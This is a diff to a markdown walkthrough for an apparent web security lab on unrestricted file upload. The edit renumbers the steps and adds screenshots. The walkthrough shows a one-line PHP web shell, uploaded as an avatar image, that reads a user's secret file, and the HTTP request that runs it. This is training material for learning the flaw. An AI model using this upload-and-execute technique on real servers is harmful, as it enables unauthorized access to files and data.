@@ -38,28 +38,34 @@ Because the payload is attacker-authored, "read one file" is only the demonstrat
 
 ## Steps to Solve the Lab
 
-1. **Log in and locate the upload feature**
+1. **Open the lab**
+   - Navigate to the lab's blog home page, in its initial **Not solved** state.
+
+   ![Lab home page](step1.png)
+
+2. **Log in and locate the upload feature**
    - Log in as `wiener` and go to **My account**.
    - Find the **Upload avatar** functionality.
 
    ![Login page](step2.png)
    ![My account page with the Upload avatar form](step3.png)
+   ![My account page with the current avatar image](step5.png)
 
-2. **Create a PHP web shell**
+3. **Create a PHP web shell**
    - Create a file named `shell.php` with the contents:
      ```php
      <?php echo file_get_contents('/home/carlos/secret'); ?>
      ```
    - When executed by the PHP interpreter, this reads Carlos's secret file and writes its contents into the HTTP response body.
 
-3. **Upload the web shell**
+4. **Upload the web shell**
    - Upload `shell.php` as the avatar.
    - The server accepts it without validating the file type, extension, or content.
    - The response confirms: `The file avatars/shell.php has been uploaded`.
 
    ![Server confirms the PHP file was uploaded](step4.png)
 
-4. **Execute the shell**
+5. **Execute the shell**
    - Request the uploaded file directly:
      ```http
      GET /files/avatars/shell.php HTTP/2
@@ -68,12 +74,12 @@ Because the payload is attacker-authored, "read one file" is only the demonstrat
 
    ![The executed web shell returns the secret in the response](answer.png)
 
-5. **Submit the secret**
+6. **Submit the secret**
    - Copy the secret value and paste it into the **Submit solution** form.
 
    ![Submitting the secret via the Submit solution dialog](step6.png)
 
-6. **Result**
+7. **Result**
    - The lab banner changes to **"Congratulations, you solved the lab!"**.
 
    ![Lab solved banner](success.png)
